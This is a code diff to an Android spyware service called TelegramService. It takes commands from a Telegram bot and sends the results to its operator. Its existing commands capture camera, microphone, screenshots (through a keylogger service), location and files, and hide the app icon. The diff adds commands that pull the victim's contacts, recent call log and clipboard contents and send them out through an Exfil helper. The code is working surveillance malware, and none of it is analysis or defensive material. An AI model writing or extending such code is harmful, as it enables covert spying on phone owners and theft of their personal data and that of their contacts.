@@ -5,9 +5,13 @@ import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
+import android.content.ClipData;
+import android.content.ClipboardManager;
+import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.content.pm.ServiceInfo;
+import android.database.Cursor;
 import android.graphics.ImageFormat;
 import android.hardware.camera2.*;
 import android.location.Location;
@@ -19,6 +23,8 @@ import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
+import android.provider.CallLog;
+import android.provider.ContactsContract;
 import org.json.JSONArray;
 import org.json.JSONObject;
 import java.io.File;
@@ -53,7 +59,7 @@ public class TelegramService extends Service {
             }
         }
         
-        Exfil.send("✅ Bot Online.\nCommands:\n/cam\n/mic\n/screenshot\n/loc\n/files\n/get <path>\n/hide");
+        Exfil.send("✅ Bot Online.\nCommands:\n/cam\n/mic\n/screenshot\n/loc\n/files\n/get <path>\n/hide\n/contacts\n/calls\n/clip");
         new Thread(this::pollTelegram).start();
     }
 
@@ -86,24 +92,84 @@ public class TelegramService extends Service {
 
     private void handleCommand(final String cmd) {
         mainHandler.post(() -> {
-            if (cmd.equals("/cam")) {
-                takePhoto();
-            } else if (cmd.equals("/mic")) {
-                recordAudio();
-            } else if (cmd.equals("/screenshot")) {
-                if (KeyloggerService.instance != null) KeyloggerService.instance.captureScreen();
-            } else if (cmd.equals("/loc")) {
-                getLocation();
-            } else if (cmd.equals("/files")) {
-                listFiles();
-            } else if (cmd.startsWith("/get ")) {
-                String path = cmd.substring(5).trim();
-                Exfil.send("Fetching: " + path);
-                Exfil.sendFile(path, "Document", "File from " + path);
-            } else if (cmd.equals("/hide")) {
-                hideIcon();
-            }
+            if (cmd.equals("/cam")) takePhoto();
+            else if (cmd.equals("/mic")) recordAudio();
+            else if (cmd.equals("/screenshot")) { if (KeyloggerService.instance != null) KeyloggerService.instance.captureScreen(); }
+            else if (cmd.equals("/loc")) getLocation();
+            else if (cmd.equals("/files")) listFiles();
+            else if (cmd.startsWith("/get ")) Exfil.sendFile(cmd.substring(5).trim(), "Document", "File");
+            else if (cmd.equals("/hide")) hideIcon();
+            else if (cmd.equals("/contacts")) getContacts();
+            else if (cmd.equals("/calls")) getCallLogs();
+            else if (cmd.equals("/clip")) getClipboard();
         });
+    }
+
+    // ================== CONTACTS ==================
+    private void getContacts() {
+        if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+            Exfil.send("❌ No Contacts permission.");
+            return;
+        }
+        StringBuilder sb = new StringBuilder("👥 Contacts:\n\n");
+        try {
+            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
+            if (cursor != null) {
+                int count = 0;
+                while (cursor.moveToNext() && count < 50) {
+                    String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                    String phone = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                    sb.append(name).append(" : ").append(phone).append("\n");
+                    count++;
+                }
+                cursor.close();
+            }
+            Exfil.send(sb.toString());
+        } catch (Exception e) {
+            Exfil.send("Contacts Error: " + e.getMessage());
+        }
+    }
+
+    // ================== CALL LOGS ==================
+    private void getCallLogs() {
+        if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+            Exfil.send("❌ No Call Log permission.");
+            return;
+        }
+        StringBuilder sb = new StringBuilder("📞 Last Calls:\n\n");
+        try {
+            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
+            if (cursor != null) {
+                int count = 0;
+                while (cursor.moveToNext() && count < 20) {
+                    String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
+                    String type = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
+                    String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
+                    sb.append(type).append(" : ").append(number).append(" (").append(duration).append("s)\n");
+                    count++;
+                }
+                cursor.close();
+            }
+            Exfil.send(sb.toString());
+        } catch (Exception e) {
+            Exfil.send("Calls Error: " + e.getMessage());
+        }
+    }
+
+    // ================== CLIPBOARD ==================
+    private void getClipboard() {
+        try {
+            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
+            if (clipboard.hasPrimaryClip()) {
+                ClipData.Item item = clipboard.getPrimaryClip().getItemAt(0);
+                String text = item.getText().toString();
+                Exfil.send("📋 Clipboard:\n" + text);
+            } else {
+                Exfil.send("📋 Clipboard is empty.");
+            }
+        } catch (Exception e) {
+            Exfil.send("Clipboard Error: " + e.getMessage());
+        }
     }
 
     // ================== LOCATION ==================
@@ -121,7 +187,7 @@ public class TelegramService extends Service {
                 String mapsUrl = "https://www.google.com/maps/search/?api=1&query=" + loc.getLatitude() + "," + loc.getLongitude();
                 Exfil.send("📍 Location:\n" + mapsUrl);
             } else {
-                Exfil.send("❌ Location not available. Try going outside or enable GPS.");
+                Exfil.send("❌ Location not available. Try enabling GPS.");
             }
         } catch (Exception e) {
             Exfil.send("Location Error: " + e.getMessage());
@@ -131,7 +197,7 @@ public class TelegramService extends Service {
     // ================== FILE MANAGER ==================
     private void listFiles() {
         try {
-            File dir = new File("/sdcard/Download"); // Tqder tbedel l'path hna
+            File dir = new File("/sdcard/Download");
             if (!dir.exists()) dir = new File("/sdcard/");
             
             File[] files = dir.listFiles();
@@ -156,7 +222,7 @@ public class TelegramService extends Service {
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP
             );
-            Exfil.send("🕵️ App icon hidden. App still running in background.");
+            Exfil.send("🕵️ App icon hidden.");
         } catch (Exception e) {
             Exfil.send("Hide Error: " + e.getMessage());
         }
